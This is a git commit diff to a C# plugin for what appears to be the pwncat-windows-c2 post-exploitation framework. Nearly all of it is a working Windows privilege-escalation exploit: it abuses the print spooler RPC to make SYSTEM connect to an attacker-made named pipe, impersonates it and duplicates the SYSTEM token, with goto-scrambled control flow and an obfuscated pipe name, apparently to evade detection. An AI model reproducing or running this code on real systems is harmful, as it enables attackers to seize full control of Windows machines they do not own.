c299224bcd22bef1d30b88bfa6f245f3ef031116
Caleb Stewart <caleb.stewart94@gmail.com>
2021-06-11 23:46:18 -0700

    Updated plugin API for changes in pwncat-windows-c2

--- Program.cs
+++ Program.cs
@@ -51,7 +51,7 @@ class Plugin
         public int dwThreadId;
     }
 
-    public static void pwncat(Assembly stagetwo)
+    public static void entry(Assembly stagetwo)
     {
         ProtocolErrorType = stagetwo.GetType("stagetwo.Protocol.ProtocolError");
     }
@@ -61,7 +61,7 @@ class Plugin
         return (Exception)Activator.CreateInstance(ProtocolErrorType, new object[] { code, message });
     }
 
-    static int get_system_token()
+    public static int get_system_token()
     {
 
         SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
@@ -74,105 +74,113 @@ class Plugin
         IntPtr pipeHandle = IntPtr.Zero;
         Thread thread = null;
 
-        goto one;
-
-    two:
-
-        // Open the printer to trigger a connection to the named pipe
-        rprn.RpcOpenPrinter(string.Format("\\\\{0}", Environment.MachineName), out rpcPrinterHandle, null, ref dEVMODE_CONTAINER, 0);
-        if (rpcPrinterHandle == IntPtr.Zero)
+        try
         {
-            CloseHandle(pipeHandle);
-            throw ProtocolError(Marshal.GetLastWin32Error(), "rpc open printer failed");
-        }
 
-        goto three;
+            goto one;
 
-    four:
+        two:
 
-        // Wait for the connect to finish
-        if (!thread.Join(5000))
-        {
+            // Open the printer to trigger a connection to the named pipe
+            rprn.RpcOpenPrinter(string.Format("\\\\{0}", Environment.MachineName), out rpcPrinterHandle, null, ref dEVMODE_CONTAINER, 0);
+            if (rpcPrinterHandle == IntPtr.Zero)
+            {
+                CloseHandle(pipeHandle);
+                throw ProtocolError(Marshal.GetLastWin32Error(), "rpc open printer failed");
+            }
+
+            goto three;
+
+        four:
+
+            // Wait for the connect to finish
+            if (!thread.Join(5000))
+            {
+                CloseHandle(rpcPrinterHandle);
+                CloseHandle(pipeHandle);
+                throw ProtocolError(-1, "connect named pipe timed out!");
+            }
+
+            goto five;
+
+        one:
+
+            string name = "--.-pipe-{0}-pipe-qpoolqq".Replace("-", "\\").Replace("q", "s");
+
+            // Create a named pipe
+            pipeHandle = CreateNamedPipeW(string.Format(name, pipeName), 0x00000003 | 0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
+            if (pipeHandle == IntPtr.Zero)
+            {
+                throw ProtocolError(Marshal.GetLastWin32Error(), "create named pipe failed");
+            }
+
+            goto two;
+
+        five:
+
+            // Impersonate the client
+            if (!ImpersonateNamedPipeClient(pipeHandle))
+            {
+                CloseHandle(rpcPrinterHandle);
+                CloseHandle(pipeHandle);
+                throw ProtocolError(Marshal.GetLastWin32Error(), "impersonate named pipe client failed");
+            }
+
+            goto six;
+
+        eight:
+
+            // Close unneeded handles
             CloseHandle(rpcPrinterHandle);
             CloseHandle(pipeHandle);
-            throw ProtocolError(-1, "connect named pipe timed out!");
-        }
+            CloseHandle(hSystemToken);
 
-        goto five;
+            return (int)hSystemTokenDup;
 
-    one:
+        three:
 
-        string name = "--.-pipe-{0}-pipe-qpoolqq".Replace("-", "\\").Replace("q", "s");
+            // Trigger connection to named pipe
+            if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(rpcPrinterHandle, 0x00000100, 0, string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName), 0) == -1)
+            {
+                CloseHandle(rpcPrinterHandle);
+                CloseHandle(pipeHandle);
+                throw ProtocolError(Marshal.GetLastWin32Error(), "rpc remote find first printer change notification failed");
+            }
 
-        // Create a named pipe
-        pipeHandle = CreateNamedPipeW(string.Format(name, pipeName), 0x00000003 | 0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
-        if (pipeHandle == IntPtr.Zero)
+            // Connect the named pipe in a background thread
+            thread = new Thread(() => ConnectNamedPipe(pipeHandle, IntPtr.Zero));
+            thread.Start();
+
+            goto four;
+
+        seven:
+
+            // Duplicate the system token
+            if (!DuplicateTokenEx(hSystemToken, 983551, 0, 2, 1, ref hSystemTokenDup))
+            {
+                CloseHandle(rpcPrinterHandle);
+                CloseHandle(pipeHandle);
+                throw ProtocolError(Marshal.GetLastWin32Error(), "duplicate token failed");
+            }
+
+            goto eight;
+
+        six:
+
+            // Retreive the system token from the current thread
+            if (!OpenThreadToken(GetCurrentThread(), 983551, false, ref hSystemToken))
+            {
+                CloseHandle(rpcPrinterHandle);
+                CloseHandle(pipeHandle);
+                throw ProtocolError(Marshal.GetLastWin32Error(), "open thread token failed");
+            }
+
+            goto seven;
+
+        } catch (Exception e)
         {
-            throw ProtocolError(Marshal.GetLastWin32Error(), "create named pipe failed");
+            throw ProtocolError(-1, e.Message);
         }
-
-        goto two;
-
-    five:
-
-        // Impersonate the client
-        if (!ImpersonateNamedPipeClient(pipeHandle))
-        {
-            CloseHandle(rpcPrinterHandle);
-            CloseHandle(pipeHandle);
-            throw ProtocolError(Marshal.GetLastWin32Error(), "impersonate named pipe client failed");
-        }
-
-        goto six;
-
-    eight:
-
-        // Close unneeded handles
-        CloseHandle(rpcPrinterHandle);
-        CloseHandle(pipeHandle);
-        CloseHandle(hSystemToken);
-
-        return (int)hSystemTokenDup;
-
-    three:
-
-        // Trigger connection to named pipe
-        if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(rpcPrinterHandle, 0x00000100, 0, string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName), 0) == -1)
-        {
-            CloseHandle(rpcPrinterHandle);
-            CloseHandle(pipeHandle);
-            throw ProtocolError(Marshal.GetLastWin32Error(), "rpc remote find first printer change notification failed");
-        }
-
-        // Connect the named pipe in a background thread
-        thread = new Thread(() => ConnectNamedPipe(pipeHandle, IntPtr.Zero));
-        thread.Start();
-
-        goto four;
-
-    seven:
-
-        // Duplicate the system token
-        if (!DuplicateTokenEx(hSystemToken, 983551, 0, 2, 1, ref hSystemTokenDup))
-        {
-            CloseHandle(rpcPrinterHandle);
-            CloseHandle(pipeHandle);
-            throw ProtocolError(Marshal.GetLastWin32Error(), "duplicate token failed");
-        }
-
-        goto eight;
-
-    six:
-
-        // Retreive the system token from the current thread
-        if (!OpenThreadToken(GetCurrentThread(), 983551, false, ref hSystemToken))
-        {
-            CloseHandle(rpcPrinterHandle);
-            CloseHandle(pipeHandle);
-            throw ProtocolError(Marshal.GetLastWin32Error(), "open thread token failed");
-        }
-
-        goto seven;
     }
 
     [DllImport("advapi32.dll", SetLastError = true)]
